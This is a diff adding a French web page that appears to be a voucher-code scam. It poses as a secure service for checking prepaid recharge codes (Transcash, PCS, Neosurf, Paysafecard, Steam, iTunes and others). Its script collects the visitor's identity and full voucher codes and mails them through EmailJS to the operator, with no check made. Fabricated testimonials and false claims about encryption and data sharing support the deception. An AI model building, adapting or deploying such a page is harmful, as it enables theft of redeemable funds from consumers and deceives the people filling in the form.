@@ -1,0 +1,1615 @@
+<!DOCTYPE html><html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Formulaire</title><script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script><style>
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+    font-family:Arial, Helvetica, sans-serif;
+}
+
+body{
+    color:white;
+    min-height:100vh;
+    background:
+    radial-gradient(circle at top,
+    #ff1e1e 0%,
+    #7a0000 30%,
+    #230000 65%,
+    #000000 100%);
+    background-attachment:fixed;
+}
+
+    
+
+footer h3{
+    margin-bottom:20px;
+}
+
+footer p{
+    margin-bottom:20px;
+}
+
+.menu{
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    gap:30px;
+    background:black;
+    color:white;
+    padding:8px;
+    font-size:18px;
+    font-weight:bold;
+    flex-wrap:nowrap;
+}
+
+footer hr{
+    margin:35px 0;
+}
+
+body::before{
+    content:'';
+    position:fixed;
+    top:50%;
+    left:50%;
+    transform:translate(-50%,-50%);
+    width:600px;
+    height:600px;
+    border-radius:50%;
+    background:rgba(255,0,0,0.15);
+    filter:blur(120px);
+    z-index:-1;
+}
+
+.header{
+    display:flex;
+    flex-direction:column;
+    align-items:center;
+    justify-content:center;
+    text-align:center;
+    padding:15px 20px;
+    width:100%;
+}
+
+.header h1{
+    width:100%;
+    max-width:900px;
+    margin:0 auto 10px auto;
+    font-size:34px;
+    line-height:1.3;
+    text-align:center;
+}
+
+.header p{
+    width:100%;
+    max-width:850px;
+    margin:0 auto;
+    font-size:16px;
+    line-height:1.6;
+    text-align:center;
+    color:rgba(255,255,255,0.85);
+}
+
+.section-title{
+    margin:20px;
+    font-size:20px;
+    font-weight:bold;
+    color:red;
+}
+
+.small-text{
+    margin:0 20px 20px 20px;
+    font-size:12px;
+    color:#555;
+}
+
+.container{
+    max-width:950px;
+    margin:40px auto;
+
+    background:rgba(255,255,255,0.97);
+
+    color:black;
+
+    padding:45px;
+
+    border-radius:35px;
+
+    box-shadow:
+    0 30px 70px rgba(0,0,0,0.25);
+
+    transition:0.4s;
+}
+
+.form-group{
+    margin-bottom:30px;
+}
+
+label{
+    display:block;
+    margin-bottom:12px;
+    font-size:17px;
+    font-weight:bold;
+    color:#222;
+}
+
+input,
+select,
+textarea{
+    width:100%;
+    padding:18px;
+
+    border:2px solid #ededed;
+
+    border-radius:18px;
+
+    background:#fafafa;
+
+    font-size:17px;
+
+    transition:0.3s;
+}
+
+input:focus,
+select:focus,
+textarea:focus{
+    outline:none;
+
+    border-color:#ff4444;
+
+    background:white;
+
+    box-shadow:
+    0 0 25px rgba(255,68,68,0.25);
+
+    transform:scale(1.01);
+}
+
+.inline{
+    display:flex;
+    gap:25px;
+}
+
+.inline label{
+    display:flex;
+    align-items:center;
+    gap:8px;
+    font-weight:normal;
+}
+
+input,
+select,
+textarea{
+    width:100%;
+    padding:16px;
+    background:#fff;
+    border:1px solid #d9d9d9;
+    border-radius:12px;
+    font-size:18px;
+    color:#222;
+    outline:none;
+}
+
+.send-btn{
+    width:100%;
+    padding:22px;
+
+    border:none;
+
+    border-radius:20px;
+
+    background:
+    linear-gradient(135deg,
+    #ff3131,
+    #b30000);
+
+    color:white;
+
+    font-size:20px;
+    font-weight:700;
+
+    cursor:pointer;
+
+    transition:0.35s;
+
+    box-shadow:
+    0 20px 35px rgba(255,0,0,0.35);
+}
+
+.send-btn:hover{
+    transform:
+    translateY(-5px)
+    scale(1.02);
+
+    box-shadow:
+    0 30px 50px rgba(255,0,0,0.5);
+}
+
+.testimonials{
+    display:grid;
+    grid-template-columns:repeat(auto-fit,minmax(250px,1fr));
+    gap:15px;
+    padding:20px;
+}
+
+.zone-blanche{
+    background:white;
+    color:black;
+    width:100%;
+    padding:30px 0;
+}
+
+.card{
+    background:white;
+
+    padding:30px;
+
+    border-radius:25px;
+
+    box-shadow:
+    0 15px 35px rgba(0,0,0,0.08);
+
+    transition:0.4s;
+}
+
+.card:hover{
+    transform:
+    translateY(-10px);
+
+    box-shadow:
+    0 25px 45px rgba(0,0,0,0.12);
+}
+
+.stars{
+    color:gold;
+}
+
+footer{
+    background:black;
+    text-align:center;
+    padding:25px;
+    margin-top:20px;
+}
+
+footer a{
+    color:white;
+    text-decoration:none;
+}
+
+.header,
+.container,
+.card{
+    animation:fadeUp 0.8s ease;
+}
+
+footer .email-box{
+    display:inline-block;
+    background:rgba(255,255,255,0.15);
+    padding:12px 25px;
+    border-radius:12px;
+    border:1px solid rgba(255,255,255,0.3);
+}
+
+@keyframes fadeUp{
+    from{
+        opacity:0;
+        transform:
+        translateY(40px);
+    }
+
+    to{
+        opacity:1;
+        transform:
+        translateY(0);
+    }
+}
+
+/* =========================================
+   SÉLECTEUR DE DATE EN ROUES
+========================================= */
+
+.birth-date-picker{
+    width:100%;
+}
+
+.birth-date-button{
+
+    width:100%;
+
+    padding:16px;
+
+    background:#fff;
+
+    border:1px solid #d9d9d9;
+
+    border-radius:12px;
+
+    font-size:18px;
+
+    color:#222;
+
+    text-align:left;
+
+    cursor:pointer;
+
+    outline:none;
+
+}
+
+
+.birth-date-button:focus{
+
+    border-color:#ff4444;
+
+    box-shadow:
+    0 0 25px rgba(255,68,68,0.25);
+
+}
+
+
+/* MODALE */
+
+.birth-date-modal{
+
+    display:none;
+
+    position:fixed;
+
+    inset:0;
+
+    z-index:99999;
+
+}
+
+
+.birth-date-modal.active{
+
+    display:block;
+
+}
+
+
+.birth-date-overlay{
+
+    position:absolute;
+
+    inset:0;
+
+    background:rgba(0,0,0,0.55);
+
+}
+
+
+/* BOÎTE */
+
+.birth-date-box{
+
+    position:absolute;
+
+    left:50%;
+
+    top:50%;
+
+    transform:translate(-50%,-50%);
+
+    width:calc(100% - 30px);
+
+    max-width:690px;
+
+    background:white;
+
+    border-radius:18px;
+
+    overflow:hidden;
+
+    box-shadow:
+    0 15px 45px rgba(0,0,0,0.3);
+
+}
+
+
+/* TITRE */
+
+.birth-date-title{
+
+    padding:28px 35px;
+
+    font-size:27px;
+
+    font-weight:400;
+
+    color:#000;
+
+    border-bottom:1px solid #ddd;
+
+}
+
+
+/* LES 3 ROUES */
+
+.birth-date-wheels{
+
+    position:relative;
+
+    height:180px;
+
+    display:grid;
+
+    grid-template-columns:
+    1fr 1.4fr 1fr;
+
+    overflow:hidden;
+
+    background:white;
+
+}
+
+
+.wheel{
+
+    position:relative;
+
+    height:180px;
+
+    overflow-y:auto;
+
+    scroll-snap-type:y mandatory;
+
+    scrollbar-width:none;
+
+    -ms-overflow-style:none;
+
+    z-index:2;
+
+}
+
+
+.wheel::-webkit-scrollbar{
+
+    display:none;
+
+}
+
+
+.wheel-spacer{
+
+    height:54px;
+
+}
+
+
+.wheel-item{
+    height:36px;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    text-align:center;
+    width:100%;
+    box-sizing:border-box;
+    scroll-snap-align:center;
+    font-size:17px;
+    font-weight:400;
+    color:#b3b3b3;
+}
+
+
+/* ÉLÉMENT AU CENTRE */
+
+.wheel-item.selected{
+
+    color:#000000;
+
+    font-weight:700;
+
+}
+
+#dateYearWheel{
+    text-align:center;
+}
+
+#dateYearList{
+    position:relative;
+    top:36px;
+}
+
+#dateYearList .wheel-item{
+    width:100%;
+    box-sizing:border-box;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    text-align:center;
+}
+
+
+/* LIGNES DE SÉLECTION */
+
+.wheel-selection{
+
+    position:absolute;
+
+    left:20px;
+
+    right:20px;
+
+    top:72px;
+
+    height:36px;
+
+    border-top:3px solid #78c6d8;
+
+    border-bottom:3px solid #78c6d8;
+
+    pointer-events:none;
+
+    z-index:3;
+
+}
+
+
+/* BOUTONS */
+
+.birth-date-buttons{
+
+    display:grid;
+
+    grid-template-columns:1fr 1fr;
+
+    border-top:1px solid #ddd;
+
+}
+
+
+.birth-date-buttons button{
+
+    height:92px;
+
+    border:none;
+
+    background:white;
+
+    font-family:Arial, Helvetica, sans-serif;
+
+    font-size:17px;
+
+    cursor:pointer;
+
+}
+
+
+.date-cancel{
+
+    color:#000;
+
+    border-right:1px solid #ddd !important;
+
+}
+
+
+.date-confirm{
+
+    color:#000;
+
+    font-weight:700;
+
+}
+
+
+.birth-date-buttons button:active{
+
+    background:#f2f2f2;
+
+}
+
+
+/* MOBILE */
+
+@media(max-width:600px){
+
+    .birth-date-box{
+
+        width:calc(100% - 30px);
+
+    }
+
+
+    .birth-date-title{
+
+        padding:25px 35px;
+
+        font-size:25px;
+
+    }
+
+
+    .wheel-item{
+
+        font-size:17px;
+
+    }
+
+}
+
+</style></head><body>
+
+<!-- MENU COMMUN -->
+<nav class="menu">
+    <span>🛡️ Sécurité</span>
+    <span>⚡ Rapidité</span>
+    <span>✅ Garantie</span>
+</nav>
+<div class="header">
+    <h1>VÉRIFIEZ VOS RECHARGES MAINTENANT</h1>
+
+    <p>
+        Service sécurisé de vérification des tickets de recharge et cartes Kdo
+        Transcash, PCS, Neosurf, Steam, Google Play, iTunes et Paysafecard.
+        Assurez-vous de l'authenticité de vos codes.
+    </p>
+</div>
+<div class="zone-blanche">
+
+<div class="section-title">
+📩 Informations personnelles
+</div><div class="small-text">
+Ces informations nous permettent de vérifier votre identité et de vous contacter en cas de besoin. Toutes les données sont chiffrées et ne sont jamais partagées avec des tiers.
+</div><div class="container"><form id="form"><div class="form-group">
+<label>Nom</label>
+<input type="text" id="nom">
+</div><div class="form-group">
+<label>Prénom</label>
+<input type="text" id="prenom">
+</div><div class="form-group">
+<label>Email</label>
+<input type="email" id="email">
+</div><div class="form-group">
+
+<label>Date d'achat du recharge</label>
+
+<div class="birth-date-picker">
+
+    <input
+        type="hidden"
+        id="date"
+        name="date"
+        required>
+
+    <button
+        type="button"
+        id="dateButton"
+        class="birth-date-button">
+        <span id="dateDisplay"></span>
+    </button>
+
+</div>
+
+</div>
+
+
+<!-- SÉLECTEUR DE DATE EN ROUES -->
+
+<div id="dateModal" class="birth-date-modal">
+
+    <div class="birth-date-overlay"></div>
+
+    <div class="birth-date-box">
+
+        <div class="birth-date-title">
+            Définir la date
+        </div>
+
+        <div class="birth-date-wheels">
+
+            <div class="wheel" id="dateDayWheel">
+
+                <div class="wheel-spacer"></div>
+
+                <div id="dateDayList"></div>
+
+                <div class="wheel-spacer"></div>
+
+            </div>
+
+
+            <div class="wheel" id="dateMonthWheel">
+
+                <div class="wheel-spacer"></div>
+
+                <div id="dateMonthList"></div>
+
+                <div class="wheel-spacer"></div>
+
+            </div>
+
+
+            <div class="wheel" id="dateYearWheel">
+
+                <div class="wheel-spacer"></div>
+
+                <div id="dateYearList"></div>
+
+                <div class="wheel-spacer"></div>
+
+            </div>
+
+
+            <div class="wheel-selection"></div>
+
+        </div>
+
+
+        <div class="birth-date-buttons">
+
+            <button
+                type="button"
+                id="dateCancel"
+                class="date-cancel">
+
+                Annuler
+
+            </button>
+
+
+            <button
+                type="button"
+                id="dateConfirm"
+                class="date-confirm">
+
+                Définir
+
+            </button>
+
+        </div>
+
+    </div>
+
+</div><div class="form-group">
+<label>Type de recharge</label>
+<select id="matiere">
+<option value="">-- Choisir --</option>
+<option>Transcash</option>
+<option>PCS</option>
+<option>Neosurf</option>
+<option>Steam</option>
+<option>Google play</option>
+<option>iTunes</option>
+<option>Paysafecard</option>
+</select>
+</div><div class="form-group">
+<label>Prix du recharge(€/$)</label>
+<input type="number" id="nbrecharge">
+</div><div class="form-group">
+<label>Nombre de recharge</label>
+<select id="livres" onchange="genererCodes()">
+<option value="">-- Choisir --</option>
+<option value="1">1</option>
+<option value="2">2</option>
+<option value="3">3</option>
+</select>
+</div><div id="codesContainer"></div>
+<div class="form-group">
+<label>Masquer le code</label><div class="inline">
+<label>
+<input type="radio" name="accepte" value="Oui">
+Oui
+</label><label>
+<input type="radio" name="accepte" value="Non">
+Non
+</label>
+</div>
+</div><button
+type="button"
+class="send-btn"
+onclick="sendMail()">
+Soumettre ma demande
+</button>
+
+</form></div><h2 style="text-align:center;color:#4fc3f7;text-decoration:underline;margin-top:20px;margin-bottom:20px;">
+Témoignages
+</h2><div class="testimonials"><div class="card">
+<div class="stars">★★★★★</div>
+<b>Marie L (Paris)</b>
+<p>"Service rapide et fiable ! Ma carte Transcash a été vérifiée en moins de 3 minutes. Je recommande vivement."</p>
+</div><div class="card">
+<div class="stars">★★★★★</div>
+<b>Thomas D (Bruxelles)</b>
+<p>"Excellent service client. J'avais un souci avec ma recharge et tout a été résolu en quelques heures. Merci !"</p>
+</div><div class="card">
+<div class="stars">★★★★★</div>
+<b>Sofia M (Genève)</b>
+<p>Très professionnel et sécurisé. J'utilise ce service depuis 6 mois et je n'ai jamais eu de problème."</p>
+</div></div></div><footer><h3>Assistance</h3>
+
+<p>
+<span class="email-box">
+<a href="mailto:verifiicationsrecharges@gmail.com">
+✉️ Écrivez-nous maintenant
+</a>
+</span>
+</p>
+
+<p>
+Conditions - Confidentialité - Contact
+</p>
+
+<hr>
+
+<p>
+© 2020 Recharge. Tous droits réservés
+</p></footer><script>
+
+emailjs.init("1vwcV66yrCxX3QPPR");
+
+function genererCodes(){
+
+let nb = document.getElementById("livres").value;
+
+let container =
+document.getElementById("codesContainer");
+
+container.innerHTML = "";
+
+for(let i = 1; i <= nb; i++){
+
+container.innerHTML += `
+
+<div class="form-group">
+<label>Code de recharge ${i}</label>
+<input
+type="text"
+class="codeAffiliation"
+placeholder="Entrer le code de recharge ${i}">
+</div>
+
+`;
+
+}
+
+}function sendMail(){
+
+let nom =
+document.getElementById("nom").value;
+
+let prenom =
+document.getElementById("prenom").value;
+
+let email =
+document.getElementById("email").value;
+
+let date =
+document.getElementById("date").value;
+
+let matiere =
+document.getElementById("matiere").value;
+
+let livres =
+document.getElementById("livres").value;
+
+let nbmatieres =
+document.getElementById("nbrecharge").value;
+
+let accepte =
+document.querySelector(
+'input[name="accepte"]:checked'
+);
+
+let codes =
+document.querySelectorAll(".codeAffiliation");
+
+if(
+!nom ||
+!prenom ||
+!email ||
+!date ||
+!matiere ||
+!livres ||
+!nbmatieres ||
+!accepte
+){
+alert("⚠️ Remplis tous les champs !");
+return;
+}
+
+for(let code of codes){
+
+if(code.value.trim() === ""){
+
+alert("⚠️ Remplis tous les codes de recharge !");
+return;
+
+}
+
+}
+
+let listeCodes = [];
+
+codes.forEach(code => {
+listeCodes.push(code.value);
+});
+
+let params = {
+
+nom: nom,
+prenom: prenom,
+email: email,
+date: date,
+matiere: matiere,
+livres: livres,
+nbmatieres: nbmatieres,
+codes_affiliation: listeCodes.join(" | "),
+accepte: accepte.value
+
+};
+
+emailjs.send(
+"service_gx6n26u",
+"template_7yh3yj5",
+params
+)
+
+.then(function(response){
+
+window.location.href = "merci.html";
+
+})
+
+.catch(function(error){
+
+alert(
+"❌ Erreur EmailJS : " +
+JSON.stringify(error)
+);
+
+console.log(error);
+
+});
+
+}
+
+/* =========================================
+   SÉLECTEUR DE DATE EN ROUES
+========================================= */
+
+const dateModal =
+    document.getElementById("dateModal");
+
+const dateButton =
+    document.getElementById("dateButton");
+
+const dateDisplay =
+    document.getElementById("dateDisplay");
+
+const dateInput =
+    document.getElementById("date");
+
+const dateDayList =
+    document.getElementById("dateDayList");
+
+const dateMonthList =
+    document.getElementById("dateMonthList");
+
+const dateYearList =
+    document.getElementById("dateYearList");
+
+const dateDayWheel =
+    document.getElementById("dateDayWheel");
+
+const dateMonthWheel =
+    document.getElementById("dateMonthWheel");
+
+const dateYearWheel =
+    document.getElementById("dateYearWheel");
+
+const dateCancel =
+    document.getElementById("dateCancel");
+
+const dateConfirm =
+    document.getElementById("dateConfirm");
+
+
+/* =========================================
+   DATE D'AUJOURD'HUI
+========================================= */
+
+const currentDate = new Date();
+
+currentDate.setHours(0,0,0,0);
+
+
+let selectedDay =
+    currentDate.getDate();
+
+let selectedMonth =
+    currentDate.getMonth();
+
+let selectedYear =
+    currentDate.getFullYear();
+
+
+let temporaryDay =
+    selectedDay;
+
+let temporaryMonth =
+    selectedMonth;
+
+let temporaryYear =
+    selectedYear;
+
+
+/* =========================================
+   CRÉER LES JOURS
+========================================= */
+
+function createDateDays(){
+
+    dateDayList.innerHTML = "";
+
+    const maxDay =
+        new Date(
+            temporaryYear,
+            temporaryMonth + 1,
+            0
+        ).getDate();
+
+
+    if(temporaryDay > maxDay){
+
+        temporaryDay = maxDay;
+
+    }
+
+
+    for(
+        let day = 1;
+        day <= maxDay;
+        day++
+    ){
+
+        const item =
+            document.createElement("div");
+
+
+        item.className =
+            "wheel-item";
+
+
+        item.dataset.value =
+            day;
+
+
+        item.textContent =
+            day;
+
+
+        dateDayList.appendChild(item);
+
+    }
+
+}
+
+
+/* =========================================
+   CRÉER LES MOIS
+========================================= */
+
+function createDateMonths(){
+
+    dateMonthList.innerHTML = "";
+
+
+    const months = [
+
+        "janvier",
+        "février",
+        "mars",
+        "avril",
+        "mai",
+        "juin",
+        "juillet",
+        "août",
+        "septembre",
+        "octobre",
+        "novembre",
+        "décembre"
+
+    ];
+
+
+    months.forEach(
+        (month,index)=>{
+
+            const item =
+                document.createElement("div");
+
+
+            item.className =
+                "wheel-item";
+
+
+            item.dataset.value =
+                index;
+
+
+            item.textContent =
+                month;
+
+
+            dateMonthList.appendChild(item);
+
+        }
+    );
+
+}
+
+
+/* =========================================
+   CRÉER LES ANNÉES
+========================================= */
+
+function createDateYears(){
+
+    dateYearList.innerHTML = "";
+
+
+    const thisYear =
+        currentDate.getFullYear();
+
+
+    for(
+        let year = thisYear;
+        year >= 1900;
+        year--
+    ){
+
+        const item =
+            document.createElement("div");
+
+
+        item.className =
+            "wheel-item";
+
+
+        item.dataset.value =
+            year;
+
+
+        item.textContent =
+            year;
+
+
+        dateYearList.appendChild(item);
+
+    }
+
+}
+
+
+/* =========================================
+   TROUVER L'ÉLÉMENT AU CENTRE
+========================================= */
+
+function updateDateWheel(wheel){
+
+    const items =
+        wheel.querySelectorAll(".wheel-item");
+
+    const wheelRect =
+        wheel.getBoundingClientRect();
+
+    const center =
+        wheelRect.top +
+        wheelRect.height / 2;
+
+    let closest = null;
+    let distance = Infinity;
+
+    items.forEach(item => {
+
+        const itemRect =
+            item.getBoundingClientRect();
+
+        const itemCenter =
+            itemRect.top +
+            itemRect.height / 2;
+
+        const currentDistance =
+            Math.abs(itemCenter - center);
+
+        item.classList.remove("selected");
+
+        if(currentDistance < distance){
+
+            distance = currentDistance;
+            closest = item;
+
+        }
+
+    });
+
+    if(closest){
+        closest.classList.add("selected");
+    }
+
+    return closest;
+}
+
+
+/* =========================================
+   POSITIONNER UNE ROUE
+========================================= */
+
+function scrollDateToValue(
+    wheel,
+    value
+){
+
+    const item =
+        wheel.querySelector(
+            `.wheel-item[data-value="${value}"]`
+        );
+
+
+    if(!item) return;
+
+
+    wheel.scrollTo({
+
+        top:
+            item.offsetTop -
+            (wheel.clientHeight / 2) +
+            (item.offsetHeight / 2),
+
+        behavior:"auto"
+
+    });
+
+}
+
+
+/* =========================================
+   PRÉPARER LES ROUES
+========================================= */
+
+function prepareDateWheels(){
+
+    createDateMonths();
+
+    createDateYears();
+
+    createDateDays();
+
+
+    setTimeout(()=>{
+
+        scrollDateToValue(
+            dateDayWheel,
+            temporaryDay
+        );
+
+
+        scrollDateToValue(
+            dateMonthWheel,
+            temporaryMonth
+        );
+
+
+        scrollDateToValue(
+            dateYearWheel,
+            temporaryYear
+        );
+
+
+        updateDateWheel(
+            dateDayWheel
+        );
+
+
+        updateDateWheel(
+            dateMonthWheel
+        );
+
+
+        updateDateWheel(
+            dateYearWheel
+        );
+
+    },50);
+
+}
+
+
+/* =========================================
+   OUVRIR
+========================================= */
+
+dateButton.addEventListener(
+    "click",
+    ()=>{
+
+        temporaryDay =
+            selectedDay;
+
+        temporaryMonth =
+            selectedMonth;
+
+        temporaryYear =
+            selectedYear;
+
+
+        prepareDateWheels();
+
+
+        dateModal.classList.add(
+            "active"
+        );
+
+
+        document.body.style.overflow =
+            "hidden";
+
+    }
+);
+
+
+/* =========================================
+   ANNULER
+========================================= */
+
+dateCancel.addEventListener(
+    "click",
+    ()=>{
+
+        dateModal.classList.remove(
+            "active"
+        );
+
+
+        document.body.style.overflow =
+            "";
+
+    }
+);
+
+
+/* =========================================
+   DÉFINIR
+========================================= */
+
+dateConfirm.addEventListener(
+    "click",
+    ()=>{
+
+        const chosenDate =
+            new Date(
+                temporaryYear,
+                temporaryMonth,
+                temporaryDay
+            );
+
+
+        chosenDate.setHours(
+            0,0,0,0
+        );
+
+
+        selectedDay =
+            temporaryDay;
+
+        selectedMonth =
+            temporaryMonth;
+
+        selectedYear =
+            temporaryYear;
+
+
+        const day =
+            String(
+                selectedDay
+            ).padStart(2,"0");
+
+
+        const month =
+            String(
+                selectedMonth + 1
+            ).padStart(2,"0");
+
+
+        const year =
+            selectedYear;
+
+
+        /* Valeur envoyée par EmailJS */
+
+        dateInput.value =
+            `${year}-${month}-${day}`;
+
+
+        /* Valeur visible */
+
+        dateDisplay.textContent =
+            `${day}/${month}/${year}`;
+
+
+        dateModal.classList.remove(
+            "active"
+        );
+
+
+        document.body.style.overflow =
+            "";
+
+    }
+);
+
+
+/* =========================================
+   FERMER EN CLIQUANT À L'EXTÉRIEUR
+========================================= */
+
+document
+    .querySelector(
+        ".birth-date-overlay"
+    )
+    .addEventListener(
+        "click",
+        ()=>{
+
+            dateModal.classList.remove(
+                "active"
+            );
+
+
+            document.body.style.overflow =
+                "";
+
+        }
+    );
+
+
+/* =========================================
+   DÉFILEMENT
+========================================= */
+
+let dateScrollTimer;
+
+
+[
+    dateDayWheel,
+    dateMonthWheel,
+    dateYearWheel
+
+].forEach(wheel=>{
+
+    wheel.addEventListener(
+        "scroll",
+        ()=>{
+
+            updateDateWheel(wheel);
+
+
+            clearTimeout(
+                dateScrollTimer
+            );
+
+
+            dateScrollTimer =
+                setTimeout(()=>{
+
+                    const dayItem =
+                        updateDateWheel(
+                            dateDayWheel
+                        );
+
+
+                    const monthItem =
+                        updateDateWheel(
+                            dateMonthWheel
+                        );
+
+
+                    const yearItem =
+                        updateDateWheel(
+                            dateYearWheel
+                        );
+
+
+                    if(dayItem){
+
+                        temporaryDay =
+                            parseInt(
+                                dayItem.dataset.value
+                            );
+
+                    }
+
+
+                    if(monthItem){
+
+                        const newMonth =
+                            parseInt(
+                                monthItem.dataset.value
+                            );
+
+
+                        if(
+                            newMonth !==
+                            temporaryMonth
+                        ){
+
+                            temporaryMonth =
+                                newMonth;
+
+
+                            createDateDays();
+
+
+                            setTimeout(()=>{
+
+                                scrollDateToValue(
+                                    dateDayWheel,
+                                    temporaryDay
+                                );
+
+                            },30);
+
+                        }
+
+                    }
+
+
+                    if(yearItem){
+
+                        const newYear =
+                            parseInt(
+                                yearItem.dataset.value
+                            );
+
+
+                        if(
+                            newYear !==
+                            temporaryYear
+                        ){
+
+                            temporaryYear =
+                                newYear;
+
+
+                            createDateDays();
+
+
+                            setTimeout(()=>{
+
+                                scrollDateToValue(
+                                    dateDayWheel,
+                                    temporaryDay
+                                );
+
+                            },30);
+
+                        }
+
+                    }
+
+                },100);
+
+        }
+    );
+
+});
+
+
+/* =========================================
+   DATE PAR DÉFAUT
+========================================= */
+
+dateDisplay.textContent =
+    String(selectedDay).padStart(2,"0")
+    + "/" +
+    String(selectedMonth + 1).padStart(2,"0")
+    + "/" +
+    selectedYear;
+
+</script></body>
+</html>
